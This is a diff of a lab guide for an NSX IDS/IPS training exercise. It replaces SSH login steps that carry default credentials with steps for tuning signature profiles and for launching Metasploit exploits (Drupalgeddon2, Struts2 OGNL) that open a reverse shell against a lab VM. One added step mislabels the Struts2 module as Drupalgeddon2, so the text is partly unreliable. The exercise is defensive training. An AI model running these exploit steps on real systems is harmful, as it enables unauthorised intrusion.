@@ -6,21 +6,17 @@ In this **optional** exercise, we will explore some more advanced options in the
  * Tuning IDS/IPS Profile to turn off irrelevant signatures
  * Attempt to evade IDS/IPS detection by using obfuscations
  * Enable IDS/IPS event logging directly from each host to a syslog collector/SIEM
-    
-    
 
-**Open a SSH/Console session to the External VM**
-1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
-    * Username **vmware**
-    * Password **VMware1!**
-2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 
+**Tuning IDS/IPS Profile to turn off irrelevant signatures**
 
-**Initiate DrupalGeddon2 attack against the App1-WEB-TIER VM (again)**
-1.	Type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
-    * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
+> **Note**: Within an IDS/IPS Profile, you can define exclusions in order to turn off particular signatures within the context of that profile. Reasons to exclude signatures include false positives, noisy or irrelevant signatures being triggered.
+
+1.	From the console session with  **External VM**, type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+    * Type **db/modules/exploit/multi/http/struts2_namespace_ognl** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
-    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
     * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
+
+> **Note**: This exploit will fail as  **App1-WEB-TIER VM** is not running an Apache Struts service vulnerable to this exploit.
     
 ```console
 msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
